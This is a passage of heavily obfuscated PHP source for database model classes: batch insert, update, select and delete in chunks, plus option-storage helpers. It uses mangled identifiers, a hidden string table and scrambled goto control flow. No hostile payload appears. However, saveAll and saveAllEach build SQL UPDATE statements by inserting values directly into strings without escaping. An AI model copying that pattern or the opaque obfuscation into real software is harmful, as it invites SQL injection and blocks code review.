$bÊπ∞Ÿàπ›->where(array($c«ÇîÃªÛâ => $D·ûéÀï∆‚))->delete(); } if (is_null($dÕ≤óÇÑﬂß)) { return $bÊπ∞Ÿàπ›->where($bâÖΩÔ§ÍÖ)->delete(); } $E¥»¨€ÿıﬂ = is_array($d§â¶Ê··õ) ? $d§â¶Ê··õ : array(); goto c‹çô¬Ç¯È; eì¡∑»’í÷: $bÊπ∞Ÿàπ›->where(array($c«ÇîÃªÛâ => $D·ûéÀï∆‚))->addAll($C∂ïôÑ ®˜, array(), !0); return !0; goto Fºâå≈ì¿Õ; dçß›œáΩÓ: $fÔâ›´¬∆ñ = $this->tableMeta[$CÉàƒÍ‚†ä[357]]; $bÊπ∞Ÿàπ› = Model($fÔâ›´¬∆ñ); $bâÖΩÔ§ÍÖ = array($c«ÇîÃªÛâ => $D·ûéÀï∆‚, $CÉàƒÍ‚†ä[358] => $d§â¶Ê··õ); goto bæ©âáàëâ; Fºâå≈ì¿Õ: } public function metaGet($bìæÔ√‘»à) { goto aìàﬁ©¢‰„; aìàﬁ©¢‰„: $c≠¯˘Ó–õî =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->tableMeta) { return array(); } $DÚÑâ¡›Æ’ = $this->tableMeta[$c≠¯˘Ó–õî[356]]; goto cÉ€ôÉªΩ; cÉ€ôÉªΩ: $dÜÉœò‹◊Ö = Model($this->tableMeta[$c≠¯˘Ó–õî[357]]); $cÓ“ûîª£Ü = array($DÚÑâ¡›Æ’ => $bìæÔ√‘»à); $a˜®ºÛÕ⁄√ = $dÜÉœò‹◊Ö->field($c≠¯˘Ó–õî[360])->where($cÓ“ûîª£Ü)->select(); goto BﬂÑ∂±Ò¿ƒ; BﬂÑ∂±Ò¿ƒ: $a˜®ºÛÕ⁄√ = array_to_keyvalue($a˜®ºÛÕ⁄√, $c≠¯˘Ó–õî[89], $c≠¯˘Ó–õî[359]); return $a˜®ºÛÕ⁄√; goto d«âåŸ¬éü; d«âåŸ¬éü: } private function checkDataAutoHas($b‚∑ÑˆÇêø) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $BﬁÇ‰ñ€Ω’) { if (in_array($b‚∑ÑˆÇêø, explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][47], $BﬁÇ‰ñ€Ω’[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eåÔ≠—ìîø, $A∆ÑÂû µá) { $cŸ»‰√éï— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($this->dataAuto as $EÜõ·®“–◊) { $bèá’Ò√Øœ = $EÜõ·®“–◊[0]; if (!in_array($A∆ÑÂû µá, explode($cŸ»‰√éï—[47], $EÜõ·®“–◊[2]))) { continue; } switch (trim($EÜõ·®“–◊[3])) { case $cŸ»‰√éï—[309]: case $cŸ»‰√éï—[310]: $eÉ¢´êäêÙ = $EÜõ·®“–◊[1]; $d‡öÑıä∏‡ = isset($EÜõ·®“–◊[4]) ? (array) $EÜõ·®“–◊[4] : array(); if ($eÉ¢´êäêÙ == $cŸ»‰√éï—[190] && array_key_exists($bèá’Ò√Øœ, $eåÔ≠—ìîø)) { if (!$eåÔ≠—ìîø[$bèá’Ò√Øœ]) { unset($eåÔ≠—ìîø[$bèá’Ò√Øœ]); } break; } if (isset($eåÔ≠—ìîø[$bèá’Ò√Øœ])) { array_unshift($d‡öÑıä∏‡, $eåÔ≠—ìîø[$bèá’Ò√Øœ]); } if ($cŸ»‰√éï—[309] == $EÜõ·®“–◊[3]) { $eåÔ≠—ìîø[$bèá’Ò√Øœ] = call_user_func_array($eÉ¢´êäêÙ, $d‡öÑıä∏‡); } else { $eåÔ≠—ìîø[$bèá’Ò√Øœ] = call_user_func_array(array(&$this, $eÉ¢´êäêÙ), $d‡öÑıä∏‡); } break; case $cŸ»‰√éï—[261]: $eåÔ≠—ìîø[$bèá’Ò√Øœ] = $eåÔ≠—ìîø[$EÜõ·®“–◊[1]]; break; case $cŸ»‰√éï—[282]: if (isset($eåÔ≠—ìîø[$bèá’Ò√Øœ]) && !is_string($eåÔ≠—ìîø[$bèá’Ò√Øœ])) { $eåÔ≠—ìîø[$bèá’Ò√Øœ] = json_encode_force($eåÔ≠—ìîø[$bèá’Ò√Øœ]); } break; case $cŸ»‰√éï—[311]: if ($eåÔ≠—ìîø[$bèá’Ò√Øœ] === $cŸ»‰√éï—[33]) { unset($eåÔ≠—ìîø[$bèá’Ò√Øœ]); } break; case $cŸ»‰√éï—[312]: $eåÔ≠—ìîø[$bèá’Ò√Øœ] = $EÜõ·®“–◊[1]; default: break; } } if ($A∆ÑÂû µá == $cŸ»‰√éï—[344]) { $eÂÈ¿µ≈å° = strtolower($this->db->getDbType()); if (strpos($eÂÈ¿µ≈å°, $cŸ»‰√éï—[9]) !== 0) { return; } $FÖ’Æ”â†à = $this->field(!0)->fields; $d‘«…È¢®„ = $FÖ’Æ”â†à[$cŸ»‰√éï—[240]]; if (isset($FÖ’Æ”â†à[$cŸ»‰√éï—[239]])) { unset($d‘«…È¢®„[$FÖ’Æ”â†à[$cŸ»‰√éï—[239]]]); } foreach ($d‘«…È¢®„ as $b’…¨å°ﬂâ => $A∆ÑÂû µá) { if (!isset($eåÔ≠—ìîø[$b’…¨å°ﬂâ])) { $eåÔ≠—ìîø[$b’…¨å°ﬂâ] = $cŸ»‰√éï—[33]; } } } } private function dataAfterFilter(&$BÁòêã◊ó—) { $Aõ’É‘øå÷ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($this->dataAuto as $Bπ«˘Ñ˘øΩ) { $FÚ÷û≤˜†¯ = $Bπ«˘Ñ˘øΩ[0]; if (!in_array($Aõ’É‘øå÷[346], explode($Aõ’É‘øå÷[47], $Bπ«˘Ñ˘øΩ[2]))) { continue; } if (!isset($BÁòêã◊ó—[$FÚ÷û≤˜†¯])) { continue; } switch (trim($Bπ«˘Ñ˘øΩ[3])) { case $Aõ’É‘øå÷[309]: case $Aõ’É‘øå÷[310]: $bŸòº™›Ñé = isset($Bπ«˘Ñ˘øΩ[4]) ? (array) $Bπ«˘Ñ˘øΩ[4] : array(); array_unshift($bŸòº™›Ñé, $BÁòêã◊ó—[$FÚ÷û≤˜†¯]); if ($Aõ’É‘øå÷[309] == $Bπ«˘Ñ˘øΩ[3]) { $BÁòêã◊ó—[$FÚ÷û≤˜†¯] = call_user_func_array($Bπ«˘Ñ˘øΩ[1], $bŸòº™›Ñé); } else { $BÁòêã◊ó—[$FÚ÷û≤˜†¯] = call_user_func_array(array(&$this, $Bπ«˘Ñ˘øΩ[1]), $bŸòº™›Ñé); } break; case $Aõ’É‘øå÷[261]: $BÁòêã◊ó—[$FÚ÷û≤˜†¯] = $BÁòêã◊ó—[$Bπ«˘Ñ˘øΩ[1]]; break; case $Aõ’É‘øå÷[282]: $fÙ¥∑º¥é∫ = $BÁòêã◊ó—[$FÚ÷û≤˜†¯]; $BÁòêã◊ó—[$FÚ÷û≤˜†¯] = json_decode($fÙ¥∑º¥é∫, !0); if (is_null($BÁòêã◊ó—[$FÚ÷û≤˜†¯])) { $BÁòêã◊ó—[$FÚ÷û≤˜†¯] = $fÙ¥∑º¥é∫; } break; case $Aõ’É‘øå÷[311]: if ($BÁòêã◊ó—[$FÚ÷û≤˜†¯] === $Aõ’É‘øå÷[33]) { unset($BÁòêã◊ó—[$FÚ÷û≤˜†¯]); } break; case $Aõ’É‘øå÷[312]: $BÁòêã◊ó—[$FÚ÷û≤˜†¯] = $Bπ«˘Ñ˘øΩ[1]; default: break; } } } public function saveAll($A±’”≈ê”û) { goto BïÖπï‰°‚; BïÖπï‰°‚: $d∆Çã˘Ö§¨ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fäÙ¢èÖÇà = $this->tablePrefix . $this->tableName; $BîãﬂÂ∂ÜŒ = self::SQL_WHERE_IN_CHUNK; goto Dä¬Ò…Û—É; Còƒ¬Ö•ú≥: $this->chunkEventSet(); goto EÎë∑¯ùÚÓ; Dä¬Ò…Û—É: $A±’”≈ê”û = is_array($A±’”≈ê”û) ? $A±’”≈ê”û : array(); $Bπã ÑûÜ› = $d∆Çã˘Ö§¨[361]; $eÆ¨â€çÓè = 0; goto dŒïêâÀû‰; dŒïêâÀû‰: $C¢âŸ¨èë· = array(); $FéºÃÑõ‡À = count($A±’”≈ê”û); for ($bö»Éâ⁄ìÒ = 0; $bö»Éâ⁄ìÒ < $FéºÃÑõ‡À; $bö»Éâ⁄ìÒ++) { $E¯œêﬁê Ö = $A±’”≈ê”û[$bö»Éâ⁄ìÒ]; if (!is_array($E¯œêﬁê Ö) || count($E¯œêﬁê Ö) != 4) { continue; } $C»…ÕÍÃƒ‘ = "\125\120\104\x41\124\105\40\140{$fäÙ¢èÖÇà}\140\40\123\x45\124\x20{$E¯œêﬁê Ö[2]}\40\x3d\40\x43\x41\123\x45\40{$E¯œêﬁê Ö[0]}\x20\12"; if ($eÆ¨â€çÓè == 0) { $Bπã ÑûÜ› = $C»…ÕÍÃƒ‘; } $C¢âŸ¨èë·[] = $d∆Çã˘Ö§¨[113] . $E¯œêﬁê Ö[1] . $d∆Çã˘Ö§¨[113]; $eÆ¨â€çÓè++; $Bπã ÑûÜ› .= "\40\x57\x48\105\116\x20\47{$E¯œêﬁê Ö[1]}\x27\x20\124\110\105\x4e\x20\x27{$E¯œêﬁê Ö[3]}\47\40\12"; if ($eÆ¨â€çÓè == $BîãﬂÂ∂ÜŒ || $bö»Éâ⁄ìÒ == $FéºÃÑõ‡À - 1) { goto eªàº¿∞Úå; a∂ÙàˆΩπ: $eÆ¨â€çÓè = 0; $Bπã ÑûÜ› = $C»…ÕÍÃƒ‘; $this->chunkEventCheck(count($C¢âŸ¨èë·)); goto AëâÜø†ºª; eªàº¿∞Úå: $d„”€ùŒˆû = implode($d∆Çã˘Ö§¨[47], $C¢âŸ¨èë·); $Bπã ÑûÜ› .= "\x20\x45\116\104\x20\x20\127\x48\x45\122\105\x20{$E¯œêﬁê Ö[0]}\x20\111\x4e\40\50{$d„”€ùŒˆû}\x29\x20"; $this->execute($Bπã ÑûÜ›); goto a∂ÙàˆΩπ; AëâÜø†ºª: $C¢âŸ¨èë· = array(); goto aíÖÜÆùçÜ; aíÖÜÆùçÜ: } } goto Còƒ¬Ö•ú≥; EÎë∑¯ùÚÓ: } public function saveAllEach($eä¥‹â›–ﬁ) { $aõôî•ÚúÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fΩÖ’Ÿ‡®» = $this->tablePrefix . $this->tableName; foreach ($eä¥‹â›–ﬁ as $Fú‹∏òéëß) { if (!is_array($Fú‹∏òéëß) || count($Fú‹∏òéëß) != 4) { continue; } $EÍ•äöàÃ¥ = $Fú‹∏òéëß[0] . $aõôî•ÚúÓ[362] . $Fú‹∏òéëß[1] . $aõôî•ÚúÓ[113]; $E“Ø≈ç‚‰Í = $Fú‹∏òéëß[2] . $aõôî•ÚúÓ[362] . $Fú‹∏òéëß[3] . $aõôî•ÚúÓ[113]; $bâ›ØüµÑû = "\x75\160\x64\x61\164\145\x20{$fΩÖ’Ÿ‡®»}\40\163\x65\164\40{$E“Ø≈ç‚‰Í}\x20\167\150\145\162\x65\x20{$EÍ•äöàÃ¥}\x3b"; $this->execute($bâ›ØüµÑû); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Aú¢Ü†êõ® = false, $dÎŒ≤É∞ÆÙ = false) { $this->_chunkEvent = $Aú¢Ü†êõ®; $this->_chunkEventParam = $dÎŒ≤É∞ÆÙ; } private function chunkEventCheck($FΩ∏éÌ©•≤) { if (!$this->_chunkEvent) { return; } $CÂÓîú—¨… = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $CÂÓîú—¨…[$_SERVER[Ä¿¡‡öóµŸﬂ‡][363]] = $FΩ∏éÌ©•≤; Hook::trigger($this->_chunkEvent, $CÂÓîú—¨…); } public function addAll($eÔÙÍ›†¿å, $cÇÎ∂ùñ◊Ö = array(), $B≤é€Ì¯ÿ¿ = false) { goto D›ÍÈüõ¶Ñ; D›ÍÈüõ¶Ñ: $a≥∏‰ïÁÑ© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; ignore_timeout(); $fÍ‘ÍÜÀµ™ = self::SQL_WHERE_IN_CHUNK; goto Dû∆“ÒåÜÙ; Dû∆“ÒåÜÙ: if (empty($eÔÙÍ›†¿å)) { $this->error = think_lang($a≥∏‰ïÁÑ©[259]); return !1; } $cÇÎ∂ùñ◊Ö = $this->_parseOptions($cÇÎ∂ùñ◊Ö); foreach ($eÔÙÍ›†¿å as $Aß∫ÏÊíÒá => $d´ÆÑèı€ﬂ) { $eÔÙÍ›†¿å[$Aß∫ÏÊíÒá] = $this->_facade($d´ÆÑèı€ﬂ); $this->_beforeInsert($eÔÙÍ›†¿å[$Aß∫ÏÊíÒá], $cÇÎ∂ùñ◊Ö); } goto d˜§‰≤â“û; d˜§‰≤â“û: if (method_exists($this->db, $a≥∏‰ïÁÑ©[260])) { for ($bÑÚº≠≈“‡ = 0; $bÑÚº≠≈“‡ < count($eÔÙÍ›†¿å); $bÑÚº≠≈“‡ += $fÍ‘ÍÜÀµ™) { $B˜∆„™‰Ãª = array_slice($eÔÙÍ›†¿å, $bÑÚº≠≈“‡, $fÍ‘ÍÜÀµ™); if (!is_array($B˜∆„™‰Ãª) || count($B˜∆„™‰Ãª) == 0) { break; } $e≈°ÕæäÂﬂ = $this->db->insertAll($B˜∆„™‰Ãª, $cÇÎ∂ùñ◊Ö, $B≤é€Ì¯ÿ¿); $this->chunkEventCheck(count($B˜∆„™‰Ãª)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eÔÙÍ›†¿å as $Aß∫ÏÊíÒá => $d´ÆÑèı€ﬂ) { $e≈°ÕæäÂﬂ = $this->db->insert($d´ÆÑèı€ﬂ, $cÇÎ∂ùñ◊Ö, $B≤é€Ì¯ÿ¿); } $this->commit(); } if (!1 !== $e≈°ÕæäÂﬂ) { $F’‰ÕúëêØ = $this->getLastInsID(); if ($F’‰ÕúëêØ) { return $F’‰ÕúëêØ; } } return $e≈°ÕæäÂﬂ; goto bÂé∫à¨ º; bÂé∫à¨ º: } public function save($FØê”·¬‘ô = '', $f‡˜™∞…Œ´ = array()) { goto Eä”ºçíÈõ; CòŒŸ◊Éßï: $d–äÚõùç≤ = $this->findWhereField($c°Ú·¥¡˜œ); if (!$d–äÚõùç≤) { return parent::save($FØê”·¬‘ô, $f‡˜™∞…Œ´); } $Bõ≥∑π¨çç = 0; goto FÏ√’Øú·á; Eä”ºçíÈõ: $EêÙ”Éè•ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E©πËÓÒ°÷ = self::SQL_WHERE_IN_CHUNK; $c°Ú·¥¡˜œ = $this->optionsValue(); goto CòŒŸ◊Éßï; FÏ√’Øú·á: $E…∑ÜÕ‚’ø = $c°Ú·¥¡˜œ[$EêÙ”Éè•ÿ[263]][$d–äÚõùç≤][1]; $E…∑ÜÕ‚’ø = is_array($E…∑ÜÕ‚’ø) ? $E…∑ÜÕ‚’ø : array(); $e∂—û±∆ï± = count($E…∑ÜÕ‚’ø); goto Fô√„∏ç«ﬂ; Fô√„∏ç«ﬂ: for ($f“◊å∂¬ûñ = 0; $f“◊å∂¬ûñ < $e∂—û±∆ï±; $f“◊å∂¬ûñ += $E©πËÓÒ°÷) { $bÒê£¨¿Èà = array_slice($E…∑ÜÕ‚’ø, $f“◊å∂¬ûñ, $E©πËÓÒ°÷); if (!is_array($bÒê£¨¿Èà) || count($bÒê£¨¿Èà) == 0) { break; } $c°Ú·¥¡˜œ[$EêÙ”Éè•ÿ[263]][$d–äÚõùç≤][1] = $bÒê£¨¿Èà; $this->optionsValue($c°Ú·¥¡˜œ); $Bõ≥∑π¨çç += parent::save($FØê”·¬‘ô, $f‡˜™∞…Œ´); $this->chunkEventCheck(count($bÒê£¨¿Èà)); } $this->chunkEventSet(); return $Bõ≥∑π¨çç; goto BèÌÉ¢ºé≈; BèÌÉ¢ºé≈: } public function add($Cÿ’ØéıÑÏ = '', $bææ‹¡ÿÉ¡ = array(), $dßí§ò†¡– = false) { if ($this->addTaskStatus && is_array($Cÿ’ØéıÑÏ)) { $this->addTaskData[] = $Cÿ’ØéıÑÏ; return; } return parent::add($Cÿ’ØéıÑÏ, $bææ‹¡ÿÉ¡, $dßí§ò†¡–); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cËóıÍ∞°ú = array()) { goto AÛÁ∑òó”÷; d∏Ã¨∑ëçÉ: $FÑ€◊ùÉºÔ = $this->findWhereField($f‹Ú¥ó¯ıù); if (!$FÑ€◊ùÉºÔ || isset($f‹Ú¥ó¯ıù[$BÉëﬂ‚ı«˜[280]]) || isset($f‹Ú¥ó¯ıù[$BÉëﬂ‚ı«˜[340]])) { return parent::select($cËóıÍ∞°ú); } $EÕÑ∏îü¶¢ = $f‹Ú¥ó¯ıù[$BÉëﬂ‚ı«˜[263]][$FÑ€◊ùÉºÔ][1]; goto bÌª®≈´Ò™; bÌª®≈´Ò™: $EÕÑ∏îü¶¢ = is_array($EÕÑ∏îü¶¢) ? $EÕÑ∏îü¶¢ : array(); $F‚øÌ‚›á√ = null; for ($EßÑ Õè¡ê = 0; $EßÑ Õè¡ê < count($EÕÑ∏îü¶¢); $EßÑ Õè¡ê += $CÀÇ∫‰îíú) { $B√ ﬂ∞ÙÑµ = array_slice($EÕÑ∏îü¶¢, $EßÑ Õè¡ê, $CÀÇ∫‰îíú); if (!is_array($B√ ﬂ∞ÙÑµ) || count($B√ ﬂ∞ÙÑµ) == 0) { break; } $f‹Ú¥ó¯ıù[$BÉëﬂ‚ı«˜[263]][$FÑ€◊ùÉºÔ][1] = $B√ ﬂ∞ÙÑµ; $this->optionsValue($f‹Ú¥ó¯ıù); $c≤…à∆Ûìﬂ = parent::select($cËóıÍ∞°ú); if (!$c≤…à∆Ûìﬂ) { continue; } if (is_null($F‚øÌ‚›á√)) { $F‚øÌ‚›á√ = array(); } $F‚øÌ‚›á√ = array_merge($F‚øÌ‚›á√, $c≤…à∆Ûìﬂ); } goto d˘†°»èÒ; d˘†°»èÒ: return $F‚øÌ‚›á√; goto fµã¥àÎ¶; AÛÁ∑òó”÷: $BÉëﬂ‚ı«˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÀÇ∫‰îíú = self::SQL_WHERE_IN_CHUNK; $f‹Ú¥ó¯ıù = $this->optionsValue(); goto d∏Ã¨∑ëçÉ; fµã¥àÎ¶: } public function delete($eñÌåÕçØÃ = array()) { goto AŒ‰‚À‹‘™; a÷ù≤éôä⁄: return $F€ñö∫“∑ñ; goto a‘´§ÑŒ≈å; A®ã°ÔÎ§Â: $Bëß©å∞€’ = $E≥π≠ôù•Ê[$DŒ€√»≥áﬂ[263]][$e¥∏Ñ¡ü•Ò][1]; $Bëß©å∞€’ = is_array($Bëß©å∞€’) ? $Bëß©å∞€’ : array(); for ($a”ôäÈóàü = 0; $a”ôäÈóàü < count($Bëß©å∞€’); $a”ôäÈóàü += $Eâ•∏≈÷ë∫) { $A¡Æ·ƒÏ»ß = array_slice($Bëß©å∞€’, $a”ôäÈóàü, $Eâ•∏≈÷ë∫); if (!is_array($A¡Æ·ƒÏ»ß) || count($A¡Æ·ƒÏ»ß) == 0) { break; } $E≥π≠ôù•Ê[$DŒ€√»≥áﬂ[263]][$e¥∏Ñ¡ü•Ò][1] = $A¡Æ·ƒÏ»ß; $this->optionsValue($E≥π≠ôù•Ê); $F€ñö∫“∑ñ += parent::delete($eñÌåÕçØÃ); } goto a÷ù≤éôä⁄; AŒ‰‚À‹‘™: $DŒ€√»≥áﬂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eâ•∏≈÷ë∫ = self::SQL_WHERE_IN_CHUNK; $E≥π≠ôù•Ê = $this->optionsValue(); goto d›Ô≥Ç¿ÉÙ; d›Ô≥Ç¿ÉÙ: $e¥∏Ñ¡ü•Ò = $this->findWhereField($E≥π≠ôù•Ê); if (!$e¥∏Ñ¡ü•Ò) { return parent::delete($eñÌåÕçØÃ); } $F€ñö∫“∑ñ = 0; goto A®ã°ÔÎ§Â; a‘´§ÑŒ≈å: } private function findWhereField($dûŸ¡Ïà˜ƒ) { $bì‘ŸÂêÿØ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B˘Ê√Ü»Æﬁ = self::SQL_WHERE_IN_CHUNK; if (!is_array($dûŸ¡Ïà˜ƒ) || !is_array($dûŸ¡Ïà˜ƒ[$bì‘ŸÂêÿØ[263]])) { return !1; } foreach ($dûŸ¡Ïà˜ƒ[$bì‘ŸÂêÿØ[263]] as $B≥„¯ÃëΩ£ => $CÇç˜üåòä) { if (is_array($CÇç˜üåòä) && isset($CÇç˜üåòä[0]) && is_string($CÇç˜üåòä[0]) && strtolower($CÇç˜üåòä[0]) == $bì‘ŸÂêÿØ[7] && is_array($CÇç˜üåòä[1]) && count($CÇç˜üåòä[1]) > $B˘Ê√Ü»Æﬁ) { ignore_timeout(); return $B≥„¯ÃëΩ£; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\155\117\160\x74\151\157\156"; public $field = array(); public function listData($b…§î›îßŒ = false, $FÃÉ±öó∑£ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\155\x65", $a‚ï¢äƒÁÚ = false) { $Aµ£Àà∑Öä = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Aµ£Àà∑Öä) { return $b…§î›îßŒ ? null : array(); } if (!$b…§î›îßŒ) { $Aµ£Àà∑Öä = array_filter(array_values($Aµ£Àà∑Öä)); return array_sort_by($Aµ£Àà∑Öä, $FÃÉ±öó∑£, $a‚ï¢äƒÁÚ); } return $Aµ£Àà∑Öä[$_SERVER[Ä¿¡‡öóµŸﬂ‡][364] . $b…§î›îßŒ]; } public function insert($D‰òäÌÉáñ) { goto D¨ìß†–êä; D¨ìß†–êä: $AÒüú¶ù§– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D‰òäÌÉáñ = array_field_key($D‰òäÌÉáñ, $this->field); $c÷ÉÑﬂ®òó = Model($this->modelType)->get($AÒüú¶ù§–[365], $this->optionType . $AÒüú¶ù§–[366]); goto a…ÖÑ„√öÆ; e¢‘ú√ù†¥: $D‰òäÌÉáñ[$AÒüú¶ù§–[107]] = time(); Model($this->modelType)->set($AÒüú¶ù§–[365], $c÷ÉÑﬂ®òó, $this->optionType . $AÒüú¶ù§–[366]); Model($this->modelType)->set($AÒüú¶ù§–[364] . $c÷ÉÑﬂ®òó, $D‰òäÌÉáñ, $this->optionType); goto CáéÃ•√—Ó; CáéÃ•√—Ó: return $c÷ÉÑﬂ®òó; goto Fî»ƒ∑ñ∏∆; a…ÖÑ„√öÆ: $c÷ÉÑﬂ®òó = $c÷ÉÑﬂ®òó ? $c÷ÉÑﬂ®òó : 0; $D‰òäÌÉáñ[$AÒüú¶ù§–[367]] = ++$c÷ÉÑﬂ®òó; $D‰òäÌÉáñ[$AÒüú¶ù§–[187]] = time(); goto e¢‘ú√ù†¥; Fî»ƒ∑ñ∏∆: } public function update($A«¥ÏùﬁÂê, $E’ƒª°ﬁ≈©) { goto B‘ôÇÌÖåÒ; B‘ôÇÌÖåÒ: $dëŒ√øÈ†á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E’ƒª°ﬁ≈© = array_field_key($E’ƒª°ﬁ≈©, $this->field); $bóè‡§à¡¿ = $this->listData($A«¥ÏùﬁÂê); goto B´¬◊ıê¢Ã; eñçÓÊ€∞ô: return Model($this->modelType)->set($dëŒ√øÈ†á[364] . $A«¥ÏùﬁÂê, $E’ƒª°ﬁ≈©, $this->optionType); goto A≤îÕÇ÷ô∫; B´¬◊ıê¢Ã: if (!$bóè‡§à¡¿) { return !1; } $E’ƒª°ﬁ≈© = array_merge($bóè‡§à¡¿, $E’ƒª°ﬁ≈©); $E’ƒª°ﬁ≈©[$dëŒ√øÈ†á[107]] = time(); goto eñçÓÊ€∞ô; A≤îÕÇ÷ô∫: } public function remove($e™ÆÒ≈•è∂) { return Model($this->modelType)->remove($_SERVER[Ä¿¡‡öóµŸﬂ‡][364] . $e™ÆÒ≈•è∂, $this->optionType); } public function clear() { $Fèê™Í£‘– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; Model($this->modelType)->remove($Fèê™Í£‘–[365], $this->optionType . $Fèê™Í£‘–[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($cÌ∑º£‹∑é, $B≥ã∂ß¬Áœ) { if (!$B≥ã∂ß¬Áœ) { return !1; } $BÀ¥ÍßŸÕ† = $this->listData(); $BÀ¥ÍßŸÕ† = array_to_keyvalue($BÀ¥ÍßŸÕ†, $cÌ∑º£‹∑é); return isset($BÀ¥ÍßŸÕ†[$B≥ã∂ß¬Áœ]) ? $BÀ¥ÍßŸÕ†[$B≥ã∂ß¬Áœ] : !1; } public function findByName($A∆•»Éññπ) { return $this->findByKey($_SERVER[Ä¿¡‡öóµŸﬂ‡][28], $A∆•»Éññπ); } protected function resetData($cëû◊∞µ…ˆ) { $A≤úË˜É„¢ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cëû◊∞µ…ˆ = is_array($cëû◊∞µ…ˆ) ? $cëû◊∞µ…ˆ : array(); $AêÒÀ¶ﬁÎ¥ = array(); for ($d≠äã≈ùÒ≈ = 0; $d≠äã≈ùÒ≈ < count($cëû◊∞µ…ˆ); $d≠äã≈ùÒ≈++) { $AêÒÀ¶ﬁÎ¥[$A≤úË˜É„¢[364] . $cëû◊∞µ…ˆ[$d≠äã≈ùÒ≈][$A≤úË˜É„¢[367]]] = $cëû◊∞µ…ˆ[$d≠äã≈ùÒ≈]; } return Model($this->modelType)->set($AêÒÀ¶ﬁÎ¥, !1, $this->optionType); } private function getAutoName($eΩ÷íÃ¥Ú›) { $aø“„Îé∞è = array_to_keyvalue($this->listData(), $_SERVER[Ä¿¡‡öóµŸﬂ‡][28]); if (!$aø“„Îé∞è || !isset($aø“„Îé∞è[$eΩ÷íÃ¥Ú›])) { return $eΩ÷íÃ¥Ú›; } for ($DÑ«Î‚∑ñ⁄ = 1; $DÑ«Î‚∑ñ⁄ < count($aø“„Îé∞è); $DÑ«Î‚∑ñ⁄++) { $AÁ—ì¥øØË = $eΩ÷íÃ¥Ú› . "\x28{$DÑ«Î‚∑ñ⁄}\51"; if (!isset($aø“„Îé∞è[$AÁ—ì¥øØË])) { return $AÁ—ì¥øØË; } } return $AÁ—ì¥øØË; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Cß√¬œ≥ª‰ = false, $B∆öÇÑ©÷˘ = '', $a√ÖªÊ›Ω· = false) { goto D÷„ﬂ†€∑ã; côé‰éÂ÷Â: $this->cacheSet($B∆öÇÑ©÷˘, $FéªÿÜÒõÜ); $FéªÿÜÒõÜ = array_merge($c›à√–®›≤, $FéªÿÜÒõÜ); return $Cß√¬œ≥ª‰ ? $FéªÿÜÒõÜ[$Cß√¬œ≥ª‰] : $FéªÿÜÒõÜ; goto b¥†ˆ÷•…Ó; Aﬂçó∑∫„Õ: $c›à√–®›≤ = is_array($c›à√–®›≤) ? $c›à√–®›≤ : array(); if (is_array($FéªÿÜÒõÜ)) { $FéªÿÜÒõÜ = array_merge($c›à√–®›≤, $FéªÿÜÒõÜ); return $Cß√¬œ≥ª‰ ? isset($FéªÿÜÒõÜ[$Cß√¬œ≥ª‰]) ? $FéªÿÜÒõÜ[$Cß√¬œ≥ª‰] : null : $FéªÿÜÒõÜ; } $f£ßœ€∏É• = $this->filterWhere(array($aÏÏÏœÆÇé[29] => $B∆öÇÑ©÷˘)); goto D¿öØŒ¿ã‘; D¿öØŒ¿ã‘: $FéªÿÜÒõÜ = $this->where($f£ßœ€∏É•)->select(); $FéªÿÜÒõÜ = array_to_keyvalue($FéªÿÜÒõÜ, $aÏÏÏœÆÇé[89], $aÏÏÏœÆÇé[359]); foreach ($FéªÿÜÒõÜ as $Aà¨èŸ“é => $d‡Ê›àãÈË) { if ($a√ÖªÊ›Ω· || in_array($Aà¨èŸ“é, $this->jsonField)) { $FéªÿÜÒõÜ[$Aà¨èŸ“é] = json_decode($d‡Ê›àãÈË, !0); } } goto côé‰éÂ÷Â; D÷„ﬂ†€∑ã: $aÏÏÏœÆÇé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FéªÿÜÒõÜ = $this->cacheGet($B∆öÇÑ©÷˘); $c›à√–®›≤ = $this->optionDefault($B∆öÇÑ©÷˘); goto Aﬂçó∑∫„Õ; b¥†ˆ÷•…Ó: } public function set($AæÀï»Ó†ô, $d¥Î∞≤Óèî = false, $AÖ“ó∏ÿ◊å = '') { goto Eöå©∂Ùªä; Eöå©∂Ùªä: $f…æ¨èÆ€Ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->cacheRemove($AÖ“ó∏ÿ◊å); $B–ùã⁄Ñº› = array(); goto a„¯√ˆ˜Ö¡; Bçöá∞“”π: return $this->addAll($B–ùã⁄Ñº›, array(), !0); goto b…á¥îøô; a„¯√ˆ˜Ö¡: $B Ω‡áå¬¨ = is_array($AæÀï»Ó†ô) ? $AæÀï»Ó†ô : array($AæÀï»Ó†ô => $d¥Î∞≤Óèî); foreach ($B 